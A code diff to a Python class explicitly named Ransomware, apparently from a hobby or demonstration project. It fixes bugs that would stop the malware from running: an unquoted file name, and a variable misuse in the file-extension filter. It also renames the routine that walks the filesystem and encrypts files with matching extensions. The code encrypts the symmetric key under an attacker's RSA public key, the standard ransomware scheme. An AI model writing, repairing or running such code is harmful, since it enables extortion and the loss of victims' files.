@@ -55,7 +55,7 @@ class Ransomware:
 		with open('fernet_key.txt','rb') as fk:
 			fernet_key=fk.read() # Store Contents Of The File As A Backup
 
-		with open(fernet_key.txt) as f:
+		with open("fernet_key.txt") as f:
 			self.public_key=RSA.importKey(open('public.pem').read()) # Import RSA Public Key Of Attacker
 			public_encryptor=PKCS1_OAEP.new(public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
 			enc_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
@@ -87,14 +87,14 @@ class Ransomware:
 		with open(file_path,'wb') as fp :
 			fp.write(_data)
 
-	def encrypt_system(self,encrypted=False):
+	def crypt_system(self,encrypted=False):
 
 		#List All Files in the system
 		system= os.walk(self.localRoot,topdown=True) # Can be Changed to sys.sysRoot
 		for root,dir,files in system :
 			for file in files :
 				file_path=os.path.join(root, file)
-				if not files.split('.')[-1] in self.file_exts:
+				if not file.split('.')[-1] in self.file_exts:
 					continue
 				if not encrypted:
 					self.crypt_file(file_path)
